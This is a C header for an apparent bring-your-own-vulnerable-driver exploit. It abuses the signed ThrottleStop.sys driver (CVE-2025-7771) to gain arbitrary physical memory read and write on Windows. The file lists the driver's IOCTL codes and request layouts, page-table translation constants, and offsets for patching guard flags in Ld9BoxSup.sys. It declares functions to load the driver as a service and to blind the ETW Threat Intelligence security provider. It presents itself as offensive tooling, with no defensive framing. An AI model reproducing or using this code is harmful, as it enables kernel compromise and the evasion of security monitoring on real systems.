/**
 * @file throttlestop.h
 * @brief ThrottleStop.sys physical memory exploit interface (C port)
 *
 * Exploits ThrottleStop.sys (CPU undervolting utility) to gain physical memory
 * read/write primitives. ThrottleStop uses MmMapIoSpace for MSR/physical memory
 * access, and is NOT on Microsoft's driver blocklist as of December 2025.
 *
 * CVE: CVE-2025-7771
 * IOCTLs: 0x80006498 (read), 0x8000649C (write)
 *
 * Primary use case: Patch Ld9BoxSup.sys -618 validation flags to enable LDR_OPEN
 *
 * Attack Flow:
 *   1. Load ThrottleStop.sys (signed, not blocklisted)
 *   2. Open device handle
 *   3. Translate driver VA -> PA (walk page tables)
 *   4. Write 1 to ntoskrnl_flag and hal_flag (2 bytes total)
 *   5. Unload ThrottleStop.sys
 *   6. LDR_OPEN now works!
 */

#ifndef BYOVD_THROTTLESTOP_H
#define BYOVD_THROTTLESTOP_H

#include "types.h"

//=============================================================================
// ThrottleStop IOCTL Definitions
//=============================================================================

// Device names - ThrottleStop creates standard DosDevices symlinks
#define TS_DEVICE_NAME         L"\\\\.\\ThrottleStop"
#define TS_DEVICE_NAME_ALT     L"\\\\.\\YOURDRIVER"

// IOCTL codes for physical memory access
// These use METHOD_BUFFERED, FILE_ANY_ACCESS
#define TS_IOCTL_PHYS_READ     0x80006498
#define TS_IOCTL_PHYS_WRITE    0x8000649C

// Alternative IOCTLs found in some versions
#define TS_IOCTL_MAP_PHYS      0x80006490
#define TS_IOCTL_UNMAP_PHYS    0x80006494

//=============================================================================
// IOCTL Structures
//=============================================================================
//
// NOTE: From Ghidra RE of ThrottleStop.sys (Dec 2025):
//
// READ (0x80006498):
//   - Input buffer: ULONGLONG PhysicalAddress (8 bytes)
//   - Input buffer size: 1, 2, 4, or 8 (THIS determines read size!)
//   - Output buffer: receives the read data
//   - Output buffer size: MUST BE 8 (driver checks == 8)
//
// WRITE (0x8000649C):
//   - Input buffer: PhysicalAddress (8 bytes) + Value (1/2/4/8 bytes)
//   - Input buffer size: 9, 10, 12, or 16 (8 + write size)
//   - Output buffer: unused (NULL)
//   - Output buffer size: 0
//
// The read size is determined by INPUT buffer size, NOT output buffer size!

#pragma pack(push, 1)

typedef struct _TS_WRITE_REQ_8 {
    UINT64 PhysicalAddress;
    UINT64 Value;
} TS_WRITE_REQ_8, *PTS_WRITE_REQ_8;

typedef struct _TS_WRITE_REQ_4 {
    UINT64 PhysicalAddress;
    UINT32 Value;
} TS_WRITE_REQ_4, *PTS_WRITE_REQ_4;

typedef struct _TS_WRITE_REQ_2 {
    UINT64 PhysicalAddress;
    UINT16 Value;
} TS_WRITE_REQ_2, *PTS_WRITE_REQ_2;

typedef struct _TS_WRITE_REQ_1 {
    UINT64 PhysicalAddress;
    UINT8  Value;
} TS_WRITE_REQ_1, *PTS_WRITE_REQ_1;

#pragma pack(pop)

// Verify structure sizes at compile time
#if defined(_MSC_VER) && !defined(__cplusplus)
// MSVC C mode: use C11 static_assert which MSVC supports
#define TS_STATIC_ASSERT(cond, msg) static_assert(cond, msg)
#elif defined(__STDC_VERSION__) && __STDC_VERSION__ >= 201112L
// C11: use _Static_assert
#define TS_STATIC_ASSERT(cond, msg) _Static_assert(cond, msg)
#else
// Fallback: compile-time check using negative array size
#define TS_STATIC_ASSERT(cond, msg) typedef char static_assertion_##__LINE__[(cond)?1:-1]
#endif

TS_STATIC_ASSERT(sizeof(TS_WRITE_REQ_8) == 16, "TS_WRITE_REQ_8 must be 16 bytes");
TS_STATIC_ASSERT(sizeof(TS_WRITE_REQ_4) == 12, "TS_WRITE_REQ_4 must be 12 bytes");
TS_STATIC_ASSERT(sizeof(TS_WRITE_REQ_2) == 10, "TS_WRITE_REQ_2 must be 10 bytes");
TS_STATIC_ASSERT(sizeof(TS_WRITE_REQ_1) == 9,  "TS_WRITE_REQ_1 must be 9 bytes");

//=============================================================================
// Page Table Constants (for VA->PA translation)
//=============================================================================

#define PT_PML4E_MASK     0x0000FF8000000000ULL  // Bits 47:39
#define PT_PDPTE_MASK     0x0000007FC0000000ULL  // Bits 38:30
#define PT_PDE_MASK       0x000000003FE00000ULL  // Bits 29:21
#define PT_PTE_MASK       0x00000000001FF000ULL  // Bits 20:12
#define PT_OFFSET_MASK    0x0000000000000FFFULL  // Bits 11:0

#define PT_PAGE_PRESENT   (1ULL << 0)
#define PT_PAGE_LARGE     (1ULL << 7)
#define PT_PFN_MASK       0x000FFFFFFFFFF000ULL

// Shifts for index extraction
#define PT_PML4E_SHIFT    39
#define PT_PDPTE_SHIFT    30
#define PT_PDE_SHIFT      21
#define PT_PTE_SHIFT      12

//=============================================================================
// -618 Bypass Offsets (from Ghidra RE analysis - Dec 2025)
//=============================================================================
//
// Memory layout in Ld9BoxSup.sys:
//   0x4a170: "ntoskrnl.exe" string
//   0x4a190: ntoskrnl GUARD flag (controls whether parsing runs)
//   0x4a1a0: ntoskrnl RESULT flag (set by parsing, checked for -618)
//   0x4a1e0: "hal.dll" string
//   0x4a200: hal GUARD flag (controls whether parsing runs)
//   0x4a210: hal RESULT flag (set by parsing, checked for -618)
//
// Critical logic in FUN_14001d330 (rtR0DbgKrnlNtInit):
//   if ((guard_ntoskrnl == 0) && (guard_hal == 0)) {
//       result_ntoskrnl = parse_ntoskrnl();  // OVERWRITES our patch!
//       result_hal = parse_hal();            // OVERWRITES our patch!
//       if (result_ntoskrnl == 0 || result_hal == 0)
//           return -618;  // ERROR!
//   }
//
// FIX: Patch GUARD flags to skip parsing entirely. If either guard is non-zero,
// the entire parsing block is skipped and -618 is never returned.
//
// OLD (BROKEN): Patched result flags which got overwritten by parsing
// NEW (CORRECT): Patch guard flags to skip the parsing block entirely

#define LD9BOX_NTOSKRNL_GUARD_OFFSET  0x4a190  // Patch this to 1 to skip parsing
#define LD9BOX_HAL_GUARD_OFFSET       0x4a200  // Patch this to 1 to skip parsing

// Legacy result flag offsets (for reference only - DO NOT PATCH THESE)
#define LD9BOX_NTOSKRNL_RESULT_OFFSET 0x4a1a0  // Gets overwritten by parsing
#define LD9BOX_HAL_RESULT_OFFSET      0x4a210  // Gets overwritten by parsing

//=============================================================================
// EPROCESS Offsets (Windows 10/11)
//=============================================================================

#define EPROCESS_DIRECTORY_TABLE_BASE  0x28   // CR3
#define EPROCESS_IMAGE_FILE_NAME       0x5a8  // "System"

//=============================================================================
// ThrottleStop Context Structure
//=============================================================================

typedef struct _TS_CTX {
    HANDLE      hDevice;            // Device handle
    SC_HANDLE   hSCManager;         // Service Control Manager handle
    SC_HANDLE   hService;           // Service handle
    bool        bInitialized;       // Device opened successfully
    bool        bDriverDeployed;    // We deployed the driver
    UINT64      SystemCr3;          // Cached SYSTEM process CR3
    UINT64      EtwSavedValue;      // Saved ETW value for restoration
    wchar_t     wszServiceName[64]; // Generated service name
    wchar_t     wszDriverPath[260]; // Path to driver file
    char        szLastError[256];   // Last error message
} TS_CTX, *PTS_CTX;

//=============================================================================
// Initialization / Cleanup
//=============================================================================

/**
 * Initialize ThrottleStop context
 * @param ctx Context to initialize
 */
void TS_Init(PTS_CTX ctx);

/**
 * Cleanup ThrottleStop context
 * @param ctx Context to cleanup
 */
void TS_Cleanup(PTS_CTX ctx);

/**
 * Initialize - Deploy and open ThrottleStop.sys
 *
 * @param ctx Context
 * @param wszDriverPath Path to ThrottleStop.sys (or NULL to use existing)
 * @return true on success
 *
 * Creates service, starts driver, opens device.
 */
bool TS_Initialize(PTS_CTX ctx, const wchar_t* wszDriverPath);

/**
 * Check if initialized
 * @param ctx Context
 * @return true if device is open
 */
bool TS_IsInitialized(PTS_CTX ctx);

/**
 * Get last error message
 * @param ctx Context
 * @return Error message string
 */
const char* TS_GetLastError(PTS_CTX ctx);

//=============================================================================
// Physical Memory Primitives - Granular Operations
//=============================================================================

/**
 * Read 8 bytes from physical memory
 *
 * @param ctx Context
 * @param physAddr Physical address to read
 * @param pValue Output: value read
 * @return true on success
 */
bool TS_ReadPhys8(PTS_CTX ctx, UINT64 physAddr, UINT64* pValue);

/**
 * Read 4 bytes from physical memory
 */
bool TS_ReadPhys4(PTS_CTX ctx, UINT64 physAddr, UINT32* pValue);

/**
 * Read 2 bytes from physical memory
 */
bool TS_ReadPhys2(PTS_CTX ctx, UINT64 physAddr, UINT16* pValue);

/**
 * Read 1 byte from physical memory
 */
bool TS_ReadPhys1(PTS_CTX ctx, UINT64 physAddr, UINT8* pValue);

/**
 * Write 8 bytes to physical memory
 *
 * @param ctx Context
 * @param physAddr Physical address to write
 * @param value Value to write
 * @return true on success
 */
bool TS_WritePhys8(PTS_CTX ctx, UINT64 physAddr, UINT64 value);

/**
 * Write 4 bytes to physical memory
 */
bool TS_WritePhys4(PTS_CTX ctx, UINT64 physAddr, UINT32 value);

/**
 * Write 2 bytes to physical memory
 */
bool TS_WritePhys2(PTS_CTX ctx, UINT64 physAddr, UINT16 value);

/**
 * Write 1 byte to physical memory
 */
bool TS_WritePhys1(PTS_CTX ctx, UINT64 physAddr, UINT8 value);

//=============================================================================
// Physical Memory Primitives - Aggregated Operations
//=============================================================================

/**
 * Read arbitrary-size physical memory
 *
 * @param ctx Context
 * @param physAddr Physical address (should be 8-byte aligned for best perf)
 * @param pBuffer Output buffer
 * @param cbSize Number of bytes to read
 * @return true on success
 *
 * Internally loops using 8-byte reads, then handles remaining 1/2/4 bytes.
 */
bool TS_ReadPhysical(PTS_CTX ctx, UINT64 physAddr, void* pBuffer, UINT32 cbSize);

/**
 * Write arbitrary-size physical memory
 *
 * @param ctx Context
 * @param physAddr Physical address
 * @param pBuffer Input buffer
 * @param cbSize Number of bytes to write
 * @return true on success
 */
bool TS_WritePhysical(PTS_CTX ctx, UINT64 physAddr, const void* pBuffer, UINT32 cbSize);

//=============================================================================
// Virtual-to-Physical Translation
//=============================================================================

/**
 * Translate virtual address to physical using CR3
 *
 * @param ctx Context
 * @param cr3 Page table root (0 = use cached SYSTEM CR3)
 * @param virtualAddr Virtual address to translate
 * @param pPhysAddr Output: physical address
 * @return true on success
 *
 * Walks the 4-level page table hierarchy:
 *   CR3 -> PML4E -> PDPTE -> PDE -> PTE -> Physical
 *
 * Handles 1GB and 2MB large pages.
 */
bool TS_VirtToPhys(PTS_CTX ctx, UINT64 cr3, UINT64 virtualAddr, UINT64* pPhysAddr);

/**
 * Get SYSTEM process CR3 for kernel address translation
 *
 * @param ctx Context
 * @return CR3 value, or 0 on failure
 *
 * Scans physical memory for SYSTEM EPROCESS.
 */
UINT64 TS_GetSystemCr3(PTS_CTX ctx);

//=============================================================================
// -618 Bypass (Main Use Case)
//=============================================================================

/**
 * Patch Ld9BoxSup.sys -618 GUARD flags to bypass module parsing
 *
 * @param ctx Context
 * @param ld9BoxBase Base address of Ld9BoxSup.sys
 * @return true if both guard flags patched successfully
 *
 * Strategy:
 *   The driver checks: if ((guard_ntoskrnl == 0) && (guard_hal == 0))
 *   If both guards are 0, it runs module parsing which can fail -> -618
 *   By setting guards to 1, we skip the entire parsing block.
 *
 * Patches:
 *   driver_base + 0x4a190 = 1 (ntoskrnl GUARD - skips parsing)
 *   driver_base + 0x4a200 = 1 (hal GUARD - skips parsing)
 *
 * After this, LDR_OPEN will succeed!
 */
bool TS_Patch618Flags(PTS_CTX ctx, UINT64 ld9BoxBase);

//=============================================================================
// ETW Blinding (Pre-Hypervisor)
//=============================================================================

/**
 * Disable ETW-TI provider via physical memory write
 *
 * @param ctx Context
 * @param ntoskrnlBase Base address of ntoskrnl.exe
 * @param offset Offset to EtwThreatIntProvRegHandle
 * @return true on success
 */
bool TS_DisableEtwTi(PTS_CTX ctx, UINT64 ntoskrnlBase, UINT64 offset);

/**
 * Restore ETW-TI provider
 *
 * @param ctx Context
 * @param ntoskrnlBase Base address of ntoskrnl.exe
 * @param offset Offset to EtwThreatIntProvRegHandle
 * @param savedValue Value saved by DisableEtwTi
 * @return true on success
 */
bool TS_EnableEtwTi(PTS_CTX ctx, UINT64 ntoskrnlBase, UINT64 offset, UINT64 savedValue);

//=============================================================================
// Service Management (Internal, but exposed for flexibility)
//=============================================================================

/**
 * Create driver service
 * @param ctx Context
 * @param wszDriverPath Full path to .sys file
 * @return true on success
 */
bool TS_CreateService(PTS_CTX ctx, const wchar_t* wszDriverPath);

/**
 * Start driver service
 * @param ctx Context
 * @return true on success
 */
bool TS_StartService(PTS_CTX ctx);

/**
 * Stop driver service
 * @param ctx Context
 * @return true on success
 */
bool TS_StopService(PTS_CTX ctx);

/**
 * Delete driver service
 * @param ctx Context
 * @return true on success
 */
bool TS_DeleteService(PTS_CTX ctx);

/**
 * Open device handle
 * @param ctx Context
 * @return true on success
 */
bool TS_OpenDevice(PTS_CTX ctx);

#endif // BYOVD_THROTTLESTOP_H
